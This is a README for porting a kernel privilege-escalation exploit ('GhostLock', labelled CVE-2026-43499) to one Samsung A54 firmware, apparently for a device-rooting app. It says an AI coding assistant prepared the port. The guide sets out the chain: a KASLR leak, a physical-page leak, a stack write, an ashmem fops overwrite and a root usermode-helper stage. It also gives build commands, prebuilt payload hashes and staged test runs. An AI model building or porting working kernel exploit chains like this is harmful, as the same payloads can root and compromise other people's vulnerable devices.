# SM-A546E FZF4 shell and app-context port

> **AI disclosure:** OpenAI Codex prepared this port and test guide under
> `@johnny-salz`'s direction. The complete chain still needs validation on the
> exact A546E hardware.

This is an initial port for the exact fingerprint containing `A546EXXSKFZF4` and kernel `5.15.189-android13-3-33470412`.

It uses:

- tracefs `sched_blocked_reason` for the exact boot KASLR slide;
- `perf_event_open` plus `mm_page_alloc` for the exact PFN of one user-controlled 4 KiB page;
- either MCAST or SIGRETURN/FPSIMD for the GhostLock stack write;
- the shared configfs, pipe physrw, and workqueue UMH stages after `ashmem_misc.fops` changes.

Two native payloads are built:

- the ADB-shell payload uses tracefs and perf as exact bring-up oracles and prints detailed stage logs;
- the app-context payload uses the real P0 fingerprint and the shared KernelSnitch physical-page path, without tracefs or perf.

Both paths still need live A546E validation. This change builds native `.so` payloads only; it does not modify or build the APK.

## Ready-built app payloads

| Backend | File | SHA-256 | Size |
| --- | --- | --- | ---: |
| MCAST | `artifacts/a54x-A546EXXSKFZF4/cve-2026-43499-app.so` | `a1e24c6b67d5db8dd8dc918d561eeae1d12f0e9747ee407bee510b2e37be8a78` | 104128 |
| SIGRETURN | `artifacts/a54x-A546EXXSKFZF4/cve-2026-43499-app-sigreturn.so` | `58c77441d472a789ec53d6c13bf7a871ff9d202add4cb03eca41a69b16253658` | 104128 |

These are hardware-test candidates, not a released support-feed entry. Verify the selected hash before every test.

## Build

From WSL:

```sh
export ANDROID_NDK_HOME=/path/to/android-ndk-r29
make TARGET=a54x-A546EXXSKFZF4 STACK_WRITER=mcast clean
make TARGET=a54x-A546EXXSKFZF4 STACK_WRITER=mcast all release perf-page-test native-mcast-test
```

For the fallback writer, replace `mcast` with `sigreturn`.

The outputs include:

```text
build/a54x-A546EXXSKFZF4/cve-2026-43499
build/a54x-A546EXXSKFZF4/cve-2026-43499-app.release.so
build/a54x-A546EXXSKFZF4/cve-2026-43499-root
```

The fingerprint can be regenerated only from the exact raw stock Image:

```sh
perl tools/generate_p0_fingerprint.pl Image 0x1f0000 \
  src/targets/a54x-A546EXXSKFZF4/p0_fingerprint.h
```

## Test order

Run each stage on the exact FZF4 firmware. The standalone perf and slide tests do not invoke GhostLock.

```powershell
.\tools\test-a54x-shell.ps1 -Serial YOUR_SERIAL -Mode probe -Writer mcast
.\tools\test-a54x-shell.ps1 -Serial YOUR_SERIAL -Mode slide -Writer mcast
.\tools\test-a54x-shell.ps1 -Serial YOUR_SERIAL -Mode page -Writer mcast
```

The perf gate must print `PERF_PAGE_OK` with exactly one `order0_match`. The probe pre-faults the two neighboring pages before enabling perf, matching the proven clean path. The slide gate must print `slide-kaslr-ok source=tracefs`. The page gate runs both safe discovery layers and the real compact payload builder, then stops before GhostLock. Stop if any gate fails.

The MCAST overlap probe invokes GhostLock. Run it only on a boot that may be rebooted afterward:

```powershell
.\tools\test-a54x-shell.ps1 -Serial YOUR_SERIAL -Mode mcast-probe -Writer mcast
```

To run the production app payload logic quickly without building an APK:

```powershell
.\tools\test-a54x-shell.ps1 -Serial YOUR_SERIAL -Mode app-route -Writer mcast
```

This uses the app payload and its P0/KernelSnitch path, but the loader still runs in the ADB shell SELinux domain. It proves the main native route, not app-domain policy. The full log remains at `/data/local/tmp/a54x-app-route.log`.

For a real app-domain test, copy one ready-built artifact to the matching local Root My Galaxy payload asset as `cve-2026-43499-app.so`, verify its hash, and launch it from the app. The APK itself is outside this change.

The first full run is one attempt only:

```powershell
.\tools\test-a54x-shell.ps1 -Serial YOUR_SERIAL -Mode full -Writer mcast
```

After a reboot, the SIGRETURN backend can be tested with:

```powershell
.\tools\test-a54x-shell.ps1 -Serial YOUR_SERIAL -Mode full -Writer sigreturn
```

Keep the full log. Important gates are `perf page ready`, `p0 physical write`, `cfi misc_fops`, `cfi write/read`, pipe physrw, and root UMH.
